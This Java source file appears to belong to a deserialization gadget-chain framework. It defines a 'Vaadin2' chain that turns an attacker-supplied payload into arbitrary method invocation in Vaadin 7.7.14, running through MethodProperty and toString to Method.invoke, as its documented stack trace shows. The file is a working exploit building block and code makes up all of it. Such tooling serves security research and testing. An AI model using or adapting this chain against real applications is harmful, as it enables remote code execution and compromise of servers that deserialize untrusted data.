package org.ses.gadgetbuilder.chains1;

import com.vaadin.data.util.MethodProperty;
import org.ses.gadgetbuilder.adapters.GetterMethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.ToStringTrampoline;
import org.ses.gadgetbuilder.util.Reflections;


/**
 * https://github.com/BofeiC/JDD-PocLearning/blob/main/src/main/java/jdk/payloadGroups/VaadinMP.java
 */

@Dependencies( { "com.vaadin:vaadin-server:7.7.14", "com.vaadin:vaadin-shared:7.7.14" })
@Authors(Authors.BofeiC)
@Impact(Impact.MethodInvoke)
public class Vaadin2 extends MethodInvokeGadgetChain<ToStringTrampoline, GetterMethodInvokeAdapter> {
    public Vaadin2(ToStringTrampoline _trampoline, GetterMethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        Object payload = this.methodInvokeAdapter.getInvocationTarget(command);
        MethodProperty<Object> nmprop = new MethodProperty<> (payload, this.methodInvokeAdapter.getGetterMethodProperty());

        return new TrampolineConnector(nmprop);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "com.vaadin.data.util.AbstractProperty.toString()\n" +
                "com.vaadin.data.util.LegacyPropertyHelper.legacyPropertyToString()\n" +
                "com.vaadin.data.util.MethodProperty.getValue()\n" +
                "java.lang.reflect.Method.invoke()";
    }
}
